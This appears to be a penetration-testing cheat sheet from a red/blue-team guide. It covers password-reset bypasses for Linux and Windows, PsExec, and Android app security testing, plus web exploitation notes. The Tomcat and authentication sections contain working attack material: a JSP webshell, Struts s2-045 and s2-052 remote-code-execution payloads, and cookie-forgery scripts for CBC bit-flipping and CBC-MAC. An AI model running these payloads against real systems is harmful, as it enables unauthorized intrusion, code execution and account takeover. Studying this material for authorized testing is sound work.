# TABLE OF CONTENTS
1. [LINUX](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#linux)
2. [WINDOWS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#windows)
3. [MOBILE](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#mobile-security-testing)
4. [WEB APPLICATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#webapplication)

<br />

# LINUX
## TABLE OF CONTENTS (LINUX)
1. [PASSWORD RECOVERY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#password-recovery-linux)


<br />

## PASSWORD RECOVERY (LINUX)
## HowTo
1. Boot up, press "e" when grub loader window appears 
2. Change last Linux-row from  `ro single` to `rw init=/bin/bash` (ro = read only; rw = read write)
3. Then press Strg+X or F10
4. Start at Recovery Mode
5. Change PW of root + user via `passwd`, then reboot

<br />

# WINDOWS
## TABLE OF CONTENTS (WINDOWS)
1. [PASSWORD RECOVERY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#password-recovery-windows)
2. [PSEXEC](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#psexec)
3. [WEBDAV](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#webdav)


<br />

## PASSWORD RECOVERY (WINDOWS)
## HowTo
1. Boot Windows from CD/USB --> select System repair --> CMD  Eingabeaufforderung
2. Select volume with Windows installed
   - `diskpart` > `list disk` > `sel disk [x]`
4. On Windows volume: `cd c:\Windows\System32`
5. Create backup of original utilman.exe: `move utilman.exe utilman.exe.bak`
6. Replace utilman with cmd: `copy cmd.exe utilman.exe`, exit
   - Alternative: `copy cmd.exe sethc.exe`, exit  (sethc.exe = Sticky-Key = Activation via 5x pressing "arrow key up")
   - Now, sethc/utilman with system privileges is available before login 
7. Start from HDD/SSD > select "Easier usage" at login window
8. CMD is opened and you can enter: `net user [Name] *`
9. Press 2 times Enter to create empty PW

<br />

## PSEXEC
## HowTo
### Start Registry with System-Privileges
- CMD (admin): psexec –i –d –s regedit.exe

### Remote Commands
- `psexec \\[IPv4] cmd`: to start CMD remotely
- `psexec \\[IPv4] -c "Z:\files\ccleaner.exe” cmd /S`: copy ccleaner -silent install

## WEBDAV
## Info
### Web-based Distributed Authoring and Versioning
- Component of **Microsoft Internet Information Server (IIS)**
- Used for editing and file management
- Interacts with core operating system components (!)
- WebDAV expose the system to possible Vulnerabilities
   - Buffer Overflow
   - DoS
   - Domain Based Scripting Attacks
   - PoE
   - RCE
- Administrators manage/edit Web Content via commands
   - `PROPFIND`, `COPY`, `MOVE`, `PROPPATCH`, `MKCOL`, `LOCK`, `UNLOCK`

<br />

# MOBILE SECURITY TESTING
## ANDROID
## Info
### Prerequisites
- [**Android Studio**](https://developer.android.com/studio/)
  - **Virtual Device Manager** (included in Android Studio) / alternatively **Genymotion**	
- **ADB** (Android Debugging Bridge):
  - `sudo apt install adb`
  - If you connect your device via USB: Enable USB Debugging, otherwise ADB won't recognize your device
  - Virtual devices are automatically recognized by ADB
  - `adb devices`: show available mobile devices
  - `adb connect host:port`: connect over TCP
  - `adb install file.apk`: install file.apk on your device
  - `adb push file /dir/on/your/dev`: put file onto your device
  - `adb pull /path/to/file  /path/on/your/dev`: get file from device
  - `adb shell "command"`: perform shell command on device
  - `adb root`: reload adb as root
- **APKtool** / **JADX** / **JD-GUI**
- **APK** (Android Package):
  - An APK is a ZIP file: `unzip file.apk`
  - The unzipped apk is not human-readable (binary format) und must additionally be decompiled
  - `apktool d file.apk`: unzip & decompile; you get .smali code (i/o .dex code)
    - Smali code is helpful when developer have obfuscated their Java code with, for instance, **ProGuard**
    - You may be still able to find reordered strings or codes
  - Key Components of an APK:
    - **AndroidManifest.xml**: Contains all Activities, Services, Broadcast Receivers, Content Providers
    - **Classes.dex**: Java bytecode in DEX (Dalvik Executable) format
    	- `unzip file.apk`
    	- `d2j-dex2jar classes.dex`
    	- `unzip classes-dex2jar.jar`
    	- `jd-gui` or `jadx com/example/android01/MainActivity.class`
    	- If developers have used obfuscation you should try to decompile the APK with APKtool to get smali code
    - **resources.arsc**: file containing precompiled resources, such as XML files for the layout
    - **res**: directory containing resources that haven't been compiled into resources.arsc
    - **META-INF**: Metadata about java packages
    - **lib**: directory containing 3rd party libraries that are part of the APK
- [**Frida**](https://frida.re/docs/home/) (Dynamic Analysis)
  - Python3.x needed
  - `pip install frida-tools`
  - **Frida Server Installation** ([github site](https://github.com/frida/frida/releases))
    1. `wget https://github.com/frida/frida/releases/download/15.1.14/frida-server-15.1.14-android-x86.xz`
    2. `unxz frida-server-15.1.14-android-x86.xz`
    3. `mv frida-server-15.1.14-android-x86.xz frida-server`
    4. `adb connect theIPofyourMobileDevice`: if you connect via TCP; if USB connection is available you can skip this step
    5. `adb push frida-server /data/local/tmp/`
    6. `adb shell "chmod 755 /data/local/tmp/frida-server"`
    7. `adb shell /data/local/tmp/frida-server &`: start frida-server in the background
       - If you get an error like "Unable to load SELinux policy from the kernel: Failed to open file “/sys/fs/selinux/policy": Permission denied
       - Then you need to re-check if your device is rooted
       - Alternatively beforehand: `adb root` or `adb shell "su -c setenforce 0"`, then `adb shell "su -c /data/local/tmp/frida-server-[..] &"` 
  - **Brida Installation**:
    - Download [Brida](https://github.com/federicodotta/Brida/releases)
    - Add Brida to Burp: `Open Burp -> Extender -> Extensions -> Add -> Choose BridaXX.jar file`
    - `pip install pyro4`
    - Tunnel Frida: `ssh -L 27042:127.0.0.1:27042 root@192.168.1.7` or click `Frida USB` in Brida 
- [**objection**](https://github.com/sensepost/objection) (Dynamic Analysis)
  - Uses Frida to assess the security posture of your mobile app w/o needing root privileges/jailbreak
  - AFTER starting the frida-server (on your mobile device) you can play around with objection
  - `adb shell /data/local/tmp/frida-server &`: start the frida-server
  - `frida-ps -Uai`: list all apps (-a) currently installed (-i) on the connected USB device (-U)
  - `objection -g com.app.name explore`: start objection by specifing your app
  - `ls`, `pwd` and so on: Use objection commands
- [**Fsecure/Drozer**](https://github.com/fsecurelabs/drozer/)
  - [Docker Container Instructions](https://github.com/FSecureLABS/drozer/tree/develop/docker) and [Docker Image](https://hub.docker.com/r/fsecurelabs/drozer)
  - `docker pull fsecurelabs/drozer`: download the pre-built docker image
  - download the drozer APK from [here](https://github.com/FSecureLABS/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk) and do `adb install drozer`
  - `docker run -it --net="host" fsecurelabs/drozer`: Open the shell and point the docker-localhost to your host-machine-localhost
  - `adb forward tcp:31415 tcp:31415`: run this command on your host machine
  - `drozer console connect --server localhost`: run this command in docker 
- [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) (Static Analysis)
  - `git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git`
  - Alternatively run it in Docker
- [**DIVA**](https://github.com/payatu/diva-android) (for Training purpose)
  - Download the source file: `git clone https://github.com/payatu/diva-android.git`
  - Open Androidstudio, go to SDK-Manager, then SDK-Tools and toggle **NDK(Side by side)** and **CMake**, click OK
  - Add the file path of **ndk-build** (~/Android/Sdk/ndk/...) to your **PATH** in .bashrc: `export PATH=/path/to/ndk-build:$PATH`
  - `nano /diva-android/app/src/main/jni/Makefile`: open Makefile and add `mkdir ../jniLibs` after line `rm -rf ../jniLibs/*`
  - Go to `cd /app/src/main/jni` and do `make` to compile the native library, which is required to build the app
  - `nano /diva-android/build.gradle`: open this file and add following lines:
  ```
  	buildscript {
  	  repositories {
        	jcenter()
        	google()
    	}
    	dependencies {
        	classpath 'com.android.tools.build:gradle:3.2.0'	#You should upgrade to 7.1.x

        	// NOTE: Do not place your application dependencies here; they belong
        	// in the individual module build.gradle files
    		}
	}

	allprojects {
    	repositories {
        	jcenter()
		#ADD maven {...}
        	maven {
            		url "https://maven.google.com"
        	}
    	     }
	}
  ```
  - To successfully finished the gradle sync you may need to replace deprecated methods in **build.gradle(:app)**
  - You can simply do it within AndroidStudio
  ```
  #replace "compile" with "implementation"
  dependencies {
    implementation fileTree(dir: 'libs', include: ['*.jar'])
    testImplementation 'junit:junit:4.12'
    implementation 'com.android.support:appcompat-v7:23.1.0'
    implementation 'com.android.support:design:23.1.0'
  ```
  - Then `Make Build` in Android Studio
  - The APK is stored here: `diva-android/app/build/outputs/apk/debug`
  - Or here: `/diva-android/app/build/intermediates/apk/debug`

<br />

## HowTo
1) Configure your **Emulator**:
   - Choose your device (with root privileges!): All Google Pixel phones are recommended
   - Choose the Android OS (pay attention to current market share or customers needs!): Android 11 and higher support ARM architecture
2) Get your **APK**:
   - [Playstore](https://play.google.com)
   - [APK mirror](https://www.apkmirror.com/) 
   - [APK monk](https://www.apkmonk.com/)
   - [F Droid](https://f-droid.org/)
   - Directly from customer
3) On your machine: **Unzip/Decompile/Deconstruct DEX**
   - `apktool d file.apk` or
   - Do `./run.sh` within mobSF directory, open your browser and go to `0.0.0.0:8000`, Drag&Drop the apk 
4) Install the APK on your emulator/physical device:
   - `adb install file.apk`  
5) **Static Analysis**:
   - Check the **File System** on your emulator/physical device:
     - GUI (Android Studio): `View -> Tool Windows -> Device File Manager`
     - CLI: `adb shell pm list packages -3 -f`: -3 = Third Party ; -f = file path
     - CLI: `frida-ps -Uai`: show all -a=apps -i=installed (incl. identifiers) connected via -U=USB on your device
     - CLI: `objection -g com.android.example explore`; then run `ls`, `env` or others
     - `adb pull /path/to/apk`: copy the data onto your machine
   - Look ALWAYS at the **AndroidManifest.xml**:
     - App permissions: `permission`
     - Backup allowance: `android:allowBackup`
     - App components: `activity, service, provider, receiver`
     - Debuggable flag: `debuggable`
   - Look for **Sensitive Data Storage**
     - `adb pull /path/to/apk`: Get a clean version of your app BEFORE first startup 
     - `adb pull /path/to/apk`: After each (critical) user interaction; to check the work flow of authentication/authorization methods implemented
     - `$ diff file1 file2`: Evaluate clean and non-clean apk (it may reveal insecure storing of data at rest)
     - **Shared Preferences**:
    	- A plain-text XML file with key:value pairs
    	- The file can be declared world-readable (accessible to all apps) or private 
     - **RealmDB**:
    	- The database and its contents can be encrypted with a key stored in the configuration file
    	- Investigate whether the key is hard-coded in the source code, resources, shared preferences etc.
     - **SQliteDB**:
    	- The directory is here: `/data/data/<package-name>/databases` 
    	- SQlite should be use with encryption enabled; The key should be retrieved from either password or server
     - **FirebaseDB**:
    	- A NoSQL cloud-hosted database that stores data JSON format and conducts real-time synchronization
    	- The synchronization remains available even when the application goes offline (!)
    	- Check for misconfigured FirebaseDB with [FireBaseScanner](https://github.com/shivsahni/FireBaseScanner)
    	- `python2 FirebaseMisconfig.py -p /path/to/apk`
     - **Internal Storage**:
    	- Files saved to internal storage are containerized by default -> they cannot be accessed by other apps
    	- Files are removed when the user uninstalls the app
     - **External Storage:
    	- Files saved to external storage are world-readable 
    	- Files stored outside `data/data/<package-name>/` will not be deleted when the user uninstalls the application
     - **Keystore**:
    	- **Best Choice**: Hardware-backed Keystore (from Android 7.0 / API level 24) with Trusted Execution Environment (TEE) or Secure Element (SE)
     - **Backups**:
    	-  The backups usually include copies of data and settings for all installed apps
    	-  Check AndroidManifest.xml: `android:allowBackup="true"`
    	-  `adb backup`: to retrieve all data from the connected device
     - **Logs**:
    	- Applications will often use the `Log Class` and `Logger Class` to create logs
     - **KeyboardCache | Screenshots**:
    	- This is mostly subject to user's behavior and his/her security awareness  
     - Check the **AndroidManifest.xml** for:
    	- `uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE`: Check general permissions
    	- Content Provider: `android:exported="true"`: If so, check that proper permissions are in force
    	- Data Handling: `MODE_WORLD_READABLE or MODE_WORLD_WRITABLE`
    	- Keyboard Cache: `android:inputType="textNoSuggestions"`: To prevent sensitive data disclosure; should be declared by activities
     - Check **Classes/Functions** for:
    	-  Data handling: `FileOutPutStream | getExternal | getWritableDatabase | getReadableDatabase | getExternalCacheDirs | getCacheDirs`
    	-  Logs: `android.util.Log | Log.d | Logger | System.out.print | System.err.print | logfile`
    	-  Notifications: `NotificationManager` (Notifications are publicly broadcasted and can thus leak private information to other apps)
    	-  Auto-generated Screenshots: `FLAG_SECURE` (if this flag is not present than sensitive info could be leaked within app switcher context)
     - Look for keywords in **Intents/Receivers**:
        - `ProcessBuiler | getExtra | putExtra | LocationManager | ACTION_CALL`
     - Check **Signature**:
     	- `apksigner verify --verbose example.apk`:  apksigner is in `Androidstudio/Sdk/build-tools/[version]`
     	- `jarsigner -verify -verbose -certs example.apk | grep -A 5 AndroidManifest.xml`: **CN=Android Debug** indicates a debug build
     	- `adb shell dumpsys package com.nondebuggableapp | grep -c "DEBUGGABLE"`: A value over 0 means the app is debuggable
6) **Dynamic Analysis**:
   - Inspect **System Logs**
     - Android Studio: `View -> Tool Windows -> Logcat` and filter your app 
     - `adb logcat > logcat.log`: Store logs permanently
   - Check the **Network Communication**:
     - `adb push /usr/sbin/tcpdump /data/` && `adb push /usr/bin/netcat /data/`: install nc and tcpdump onto your mobile device
     - `tcpdump -i wlan0 -s0 -w - | nc -l -p 11111`: sniff and pipe network traffic on your device
     - `adb forward tcp:11111 tcp:11111`: forward the traffic to your machine
     - `nc localhost 11111 | wireshark -k -S -i -`: capture the traffic via Wireshark (-k immediately | -S auto update packet display | -i - stdin)
   - Install **Burp** CA certificate on device to **intercept encrypted traffic**
     - Download cacert.der from 127.0.0.1:8080
     - `mv cacert.der cacert.crt`: Change the file extension from .der to .crt 
     - `adb push cacert.crt /mnt/sdcard/Download`
     - On Device: Settings>Security>Install from Storage>Select cacert.crt  
     - If you face a situation where the app, the OS or any mechanism (SSL Pinning) blocks your interception then refer to [MSTG](https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05b-basic-security_testing#setting-up-an-interception-proxy)
   - Data Manipulation with **Frida**: 
     - `adb shell /data/local/tmp/frida-server &`: start frida-server in the background
     - `./frida-server -l 0.0.0.0 -D`: start it on your device if network connection is used
     - `frida -n [appname]`: spawn a shell
   
<br />

# WEBAPPLICATION
 - [Wiki/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Wiki/Web%20Application.md)
 - [Reconnaissance/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/1_Reconnaissance.md#web-application)

## LEASSONS LEARNED
1. [BASICS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#basics)
2. [APACHE TOMCAT](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#apache-tomcat)
3. [AUTHENTICATION (CSRF | CBC | OAUTH | SAML)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#authentication-csrf--cbc--ecb--oauth--saml)
4. [CGI](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#cgi-common-gateway-interface)
5. [COMMAND INJECTION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#command-injection)
6. [(DE)SERIALIZATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#deserialization)
7. [DIRECTORY TRAVERSAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#directory-traversal)
8. [FILE INCLUSION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#file-inclusion)
9. [GRAPHQL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#graphql)
10. [HTTP HEADERS (SECURE)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#http-headers-secure)
11. [HTTP METHODS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#http-method-manipulation)
12. [JSON WEB TOKEN](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#json-web-token)
13. [LIGHTWEIGHT DIRECTORY ACCESS PROTOCOL (LDAP)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#lightweight-directory-access-protocol-ldap)
14. [OPEN REDIRECT](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#open-redirect)
15. [PASSWORD HACKING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#password-hacking)
16. [RUBY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#ruby)
17. [SERVER SIDE REQUEST FORGERY (SSRF)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#server-side-request-forgery)
18. [SERVER SIDE TEMPLATE INJECTION (SSTI)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#server-side-template-injection)
19. [SESSION INJECTION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#session-injection)
20. [SESSION FIXATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#session-fixation)
21. [SQLi](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#sqli)
22. [TEMPLATE INJECTION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#template-injection)
23. [XML](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#xml)
24. [XSS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#xss)

<br />

## BASICS
### Use RHOST
- `rhost=[IPv4 of your target machine]`: Save time and create one variable for the Remote Host IP address
- `echo $rhost`: show the value of rhost
- `unset rhost`: clear the value of rhost

### Search Exploits
- google --> <service_name> [version] exploit
- shodan --> https://exploits.shodan.io/
- searchsploit (= ExploitDB lookup)
   - `searchsploit apache mod_ssl`
   - `searchsploit -w ftp`: show ftp exploits including web-links
- msf: `search platform:windows port:135 target:XP type:exploit`

### Run Own Server
- `alias web="ruby -run -ehttpd . -p3000"`: Make an alias for quick server start up 
- `alias web="python2 -m SimpleHTTPServer -p3000"`: Alternatively in Python2
- `alias web="python3 -m http.server -p3000"`: Alternatively in Python3

### Recommended Burp Plugins
- AdditionalScannerChecks
- ActiveScan++
- AuthMatrix / Authorize
- ErrorMessagesCheck
- HTML5 Auditor
- Retire.js
- EsPReSSO
- J2EEScan
- Java Deserialization Scanner
- Software vulnerability Scanner
- CSTC
- log4shell Scanner
- JSON web Token Attacker
- Param Miner
- Freddy
- HTTP Request Smuggler

### General Checks
- **Username Enumeration**
  - Login as valid user/invalid password
  - Login as invalid user/invalid password
  - Compare error messages
- **Secure Cookie Flags**
  - Observe response headers after authentication
- **Secure HTTP Headers**
- **Implementation of CSRF**
  - Systematically check and evaluate CSRF tokens in all requests
  - CSRF-Token should be sent via POST (i/o GET method)
- **Information Disclosure through Error Messages**
- **Client Side Validation Only**
  - Check if user-controllable data is only tested on client side or on server side too 
- **Patch management for 3rd party libraries**
  - Use Burp Scanner with appropriate extensions 
- **Brute Force Protection**
  - Any fail2ban or login attempt throtteling in place? 
- **Information Disclosure in HTTP Headers**
  - Server Version: If observed server version appears old, then check if this server is backported (= security fixes from new software incl.)  
- **Host header poisoning**
  - Inject arbitrary host names alike "vhost" or "google.com" 
- **HTML5 Cross-Origin Resource Sharing**
  - Check enforced CORS-Policy


<br />

## APACHE TOMCAT
## Info
- Apache Tomcat is used to deploy Java Servlets and JSPs (Java Server Pages)
- One can build WAR (Web ARchive) files, and drop it in the deploy directory in Tomcat
- Basically, Apache is an HTTP Server, serving HTTP vs. Tomcat is a Servlet and JSP Server serving Java technologies
- **Tomcat 9**:
	- Access to the Manager is disabled by default
	- In addition to that, there is no default username and password
	- You must create a new username/password combination and associate it with the manager-gui role
	- To do this, you’ll need to modify the **$CATALINA_BASE/conf/tomcat-users.xml** file
- **Tomcat Roles**:
   - manager-gui: Access to the Manager interface through the browser. The web interface comes with CSRF protection
   - manager-status: Server Status page access only
   - manager-script: Like manager-gui but using the text interface instead of the HTML GUI. Used by admins to write scripts for automation
   - manager-jmx: JMX proxy access for monitoring
- Older Tomcat Versions may have default credentials:
   - Usernames: tomcat, admin, manager, user
   - Passwords: admin, tomcat, password, "empty"
- Older Tomcat Versions may be vulnerable to **CVE-2007-1860**
   - Vulnerable module: **mod_jk**
   - Use Double Encoding to get to manager-GUI: `example.com/examples/jsp/%252e%252e/%252e%252e/manager/html/`
	- If CSRF protection is in place than you need valid session cookie: `Cookie: JSESSIONID=189D63B9BBBBBBB0DF29CFF84135F2; Path=/manager/; HttpOnly`

## HowTo
### Example JSP Webshell
```
$ sudo apt install fastjar (for jar-packaging capability)
$ mkdir webshell
$ cp index.jsp webshell
$ cd webshell
$ jar -cvf ../webshell.war *

#index.jsp:

<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

### Struts RCE
- [Struts s2-045 Vulnerability](https://struts.apache.org/docs/s2-045.html)
```
#Usage: ./struts [URL] [COMMAND]
#nano struts

curl --header "Content-Type: %{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='""$2""').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" $1
```
### Struts RCE
- [Struts s2-052](https://cwiki.apache.org/confluence/display/WW/S2-052)
- `curl http://example.com/foo -X POST -H "Content-Type: application/xml" --data @payload.xml`
- [Credits](https://github.com/0x00-0x00/-CVE-2017-9805/blob/master/s2-052.py)
```
#payload.xml

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>YOUR PAYLOAD</string>				<----
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>p4WVJLW2H</name>
                  </filter>
                  <next class="string">6Fcg22xLlaHiIK8</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```

<br />

## AUTHENTICATION (CSRF / CBC / ECB / OAUTH / SAML)
1. [GENERAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#general-auth)
2. [CBC](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#cbc)
3. [CBC-MAC](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#cbc-mac)
4. [ECB](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#ecb)
5. [LENGTH ATTACK](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#length-extension-attack)
6. [OAUTH2](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#oauth2)
7. [SAML](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#saml)
8. [XSRF](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#xsrfcsrf)

<br />

## GENERAL AUTH
- CSRF Tokens should be changed with every session, not with every request
- Authentication setup via cookie is a **bad idea** (cookie content can be modified by users)
```
# WRONG Practice

<?php
#some code
if (isset($_COOKIE['auth'])){
	$user = $_COOKIE['auth'];
}

#some code
?>
```
- MySQL user name comparison:
   - You create a user and programmatically (i.e.: in Ruby) there is a background check with existing users
   - When the user's details get retrieved, the comparison is done by the database
   - By default, MySQL (type **VARCHAR**) will perform case-insensitive comparison: "admin" = "Admin"
- MySQL trailing
   - MySQL ignores trailing spaces (i.e.: hacker and hacker[space] are equals)
   - This weakness can be leveraged by register admin[space]

<br />

## CBC
- **Cipher Block Chain**
- It may happen that authentication is supplied with CBC encryption (applied upon the Auth-Cookie)
- If so, you can try to exploit the mechanism as follows (**if the InitVecotr is stored TOGETHER with the ciphertext!**):
  - Login with username similar to "admin" ("bdmin", "cdmin" ...)
  - Catch the Auth-Cookie, which is sent with HTTP Response
  - Decode the cookie to get the first byte; assuming the cookie syntax as "InitVector:EncryptedText" 
     - Example for encrypted cookie (referred to "ddmin"): `KZeWzs85KlXXvOwvCRqfrN6WRXPiZtc9`  
     - Decode in Base64: `)ÎÏ9*U×¼ì/	¬ÞEsâf×=`
     - Change to hex format (here the first 8 bytes): `00000000	29 97 96 ce cf 39 2a 55`
     - XOR Operation of the 1st byte from IV + "admin" + "ddmin": `python3 -c 'print(0x29 ^ ord("a") ^ ord("d"))'` --> `44` (decimal format)
     - Turn decimal to hex: `python3 -c 'print("%2x" % 44)'` --> `2c`
     - Implement `2c` into IV as first byte and generate new Base64 encoded cookie: `00000000 2c 97 96 ce cf 39 2a 55` --> `LJeWzs85KlXXvOwvCRqfrN6WRXPiZtc9`
  - Incorporate the new cookie into your HTTP request, send it out and get access as admin

## CBC-MAC
- With CBC-MAC, we can generate two signatures t and t' for the messages m and m'
- By using m and m' we can forge another message m'' that will have the same signature as m' (t')
- A) Login as "administ"
- B) Decode cookie, extract signature
- C) XOR the signature with "rator"
- D) Login with this value as username
- E) Decode new cookie, extract signature
- F) Concatenate signature with "administrator" to get final cookie for admin-login
```
import requests
import base64

def login(username):
    url = "https://example.com"
    data = {"username":username, "password":"password"}
    r1 = requests.post(url+"/login.php", data=data, allow_redirects=False)
    r2 = requests.get(url+"/index.php")
    return r1.headers['set-cookie'].split("=")[1]


def xor(a, b):
    return ''.join(chr(ord(a[i]) ^ ord(b[i])) for i in range(0,8))


cookie1 = login("administ").encode()
signature1 = str(base64.b64decode(cookie1)).split("--")[1].strip("'")
#username2 = xor("administ", "\00\00\00\00\00\00\00\00") --> returns "administ" --> POC
username2 = xor("rator\00\00\00", signature1)

cookie2 = login(username2).encode()
signature2 = str(base64.b64decode(cookie2)).split("--")[1].strip("'")
cookie3 = 'administrator--' + signature2
cookie3 = base64.b64encode(cookie3.encode()).decode().strip("=")
print(cookie3)
```
<br />

### ECB
- **Electronic Code Book**
- Authentication based on ECB encryption is a bad idea due to following securoity impacts:
  - You can detect patterns if repitions occur !
  - Blocks can be removed without breaking the encryption !
  - Blocks can be swapped around without breaking the encryption ! 

<br />

## Length Extension Attack
- [Wiki](https://en.wikipedia.org/wiki/Length_extension_attack)
-  Algorithms like MD5, SHA-1 and most of SHA-2 are susceptible to this kind of attack
-  SHA-384, SHA-512/256 and HMAC are not susceptible
-  The infamous code construction that leads to LEA: `H(secret ‖ message)`
```
#python
#BAD IDEA
data = secret + message
sig = hashlib.sha256(data.encode('utf-8')).hexdigest()

#GOOD IDEA
data = message
sig = base64.urlsafe_b64encode(hmac.new(secret, data.encode('utf-8'), hashlib.sha256).digest())
```

### HowTo
1. You need to know the original signed message + message signature (token) + key length (you have to guess or know it)
2. Append the payload
3. Rehash the message
4. Resend the token to the (web) application
5. A helpful tool is the [Hash Extender](https://pypi.org/project/HashExtender/): `pip install HashExtender` 
6. Or even better: [https://github.com/iagox86/hash_extender](https://github.com/iagox86/hash_extender)

<br />

## OAUTH2
### Authorization Server CSRF
- **Requirement: Missing CSRF security!**
- **Blue Team**: Configure Authorization Server with active Anti-CSRF security
1. Register Oauth2 Client
2. Create malicious page that sends POST request automatically with hidden parameter and redirect to itself
3. Get victim to visit your malicious page
4. Retrieve the code and convert it into access token
